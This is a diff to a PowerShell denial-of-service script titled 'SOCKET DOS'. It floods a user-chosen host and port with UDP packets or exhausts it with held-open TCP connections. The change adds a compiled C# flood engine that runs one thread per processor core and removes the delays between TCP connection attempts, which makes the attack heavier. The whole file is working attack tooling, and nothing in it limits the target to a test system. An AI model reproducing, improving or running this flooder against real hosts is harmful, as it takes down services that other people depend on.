@@ -2,9 +2,8 @@ Clear-Host
 
 $Host.UI.RawUI.WindowTitle = "SOCKET DOS"
 
-$connect_delay_ms = 100
-$udp_packet_size_bytes = 1024
-$udp_progress_interval = 10000
+$worker_count = [Environment]::ProcessorCount
+$udp_packet_size_bytes = 1472
 
 $protocol = ""
 while ($protocol -ne "TCP" -and $protocol -ne "UDP") {
@@ -23,40 +22,104 @@ while ($port_number -lt 1 -or $port_number -gt 65535) {
 
 Write-Host "-------------------------------- SOCKET DOS $protocol --------------------------------" -ForegroundColor Yellow
 
+# compiled flood engine so the send loop is not throttled by the PowerShell interpreter
+$flood_source = @"
+using System;
+using System.Collections.Concurrent;
+using System.Net.Sockets;
+using System.Threading;
+
+public static class SocketFlood
+{
+    public static volatile bool StopRequested;
+    public static long UdpPacketsSent;
+    public static long TcpConnectionsHeld;
+    private static readonly ConcurrentBag<TcpClient> HeldClients = new ConcurrentBag<TcpClient>();
+
+    public static void FloodUdp(string targetHost, int port, int packetSizeBytes, int workerCount)
+    {
+        var payload = new byte[packetSizeBytes];
+        for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
+        {
+            var worker = new Thread(delegate()
+            {
+                using (var sender = new UdpClient())
+                {
+                    sender.Connect(targetHost, port);
+                    while (!StopRequested)
+                    {
+                        sender.Send(payload, payload.Length);
+                        Interlocked.Increment(ref UdpPacketsSent);
+                    }
+                }
+            });
+            worker.IsBackground = true;
+            worker.Start();
+        }
+    }
+
+    public static void FloodTcp(string targetHost, int port, int workerCount)
+    {
+        for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
+        {
+            var worker = new Thread(delegate()
+            {
+                while (!StopRequested)
+                {
+                    var client = new TcpClient();
+                    try
+                    {
+                        client.Connect(targetHost, port);
+                        HeldClients.Add(client);
+                        Interlocked.Increment(ref TcpConnectionsHeld);
+                    }
+                    catch (Exception)
+                    {
+                        client.Close();
+                        Thread.Sleep(20);
+                    }
+                }
+            });
+            worker.IsBackground = true;
+            worker.Start();
+        }
+    }
+
+    public static void ReleaseTcpConnections()
+    {
+        TcpClient releasedClient = null;
+        while (HeldClients.TryTake(out releasedClient))
+        {
+            releasedClient.Close();
+        }
+    }
+}
+"@
+Add-Type -TypeDefinition $flood_source -Language CSharp
+
 if ($protocol -eq "TCP") {
-    Write-Host "Flooding $host_address`:$port_number with TCP connections (Ctrl+C to stop and release)..." -ForegroundColor Yellow
-    $connections = New-Object System.Collections.Generic.List[System.Net.Sockets.TcpClient]
+    Write-Host "Flooding $host_address`:$port_number with TCP connections from $worker_count parallel workers (Ctrl+C to stop and release)..." -ForegroundColor Yellow
+    [SocketFlood]::FloodTcp($host_address, $port_number, $worker_count)
     try {
         while ($true) {
-            $client = New-Object System.Net.Sockets.TcpClient
-            try {
-                $client.Connect($host_address, $port_number)
-                $connections.Add($client)
-                Write-Host "Held open: $($connections.Count) connections"
-                Start-Sleep -Milliseconds $connect_delay_ms
-            } catch {
-                Write-Host "Connect failed after $($connections.Count) connections held; holding them open (Ctrl+C to release)" -ForegroundColor Red
-                while ($true) { Start-Sleep -Milliseconds 500 }
-            }
+            Start-Sleep -Seconds 1
+            Write-Host ("Held open: {0:N0} connections" -f [SocketFlood]::TcpConnectionsHeld)
         }
     } finally {
-        foreach ($client in $connections) { $client.Close() }
+        [SocketFlood]::StopRequested = $true
+        Start-Sleep -Milliseconds 300
+        [SocketFlood]::ReleaseTcpConnections()
+        Write-Host "Connections released" -ForegroundColor Yellow
     }
 } else {
-    Write-Host "Flooding $host_address`:$port_number with UDP packets (Ctrl+C to stop)..." -ForegroundColor Yellow
-    $sender = New-Object System.Net.Sockets.UdpClient
-    $sender.Connect($host_address, $port_number)
-    $packet = New-Object byte[] $udp_packet_size_bytes
+    Write-Host "Flooding $host_address`:$port_number with UDP packets from $worker_count parallel workers (Ctrl+C to stop)..." -ForegroundColor Yellow
+    [SocketFlood]::FloodUdp($host_address, $port_number, $udp_packet_size_bytes, $worker_count)
     try {
-        $sent_count = 0
         while ($true) {
-            $sender.Send($packet, $packet.Length) | Out-Null
-            $sent_count++
-            if ($sent_count % $udp_progress_interval -eq 0) {
-                Write-Host "Sent: $sent_count packets"
-            }
+            Start-Sleep -Seconds 1
+            Write-Host ("Sent: {0:N0} packets" -f [SocketFlood]::UdpPacketsSent)
         }
     } finally {
-        $sender.Close()
+        [SocketFlood]::StopRequested = $true
     }
 }
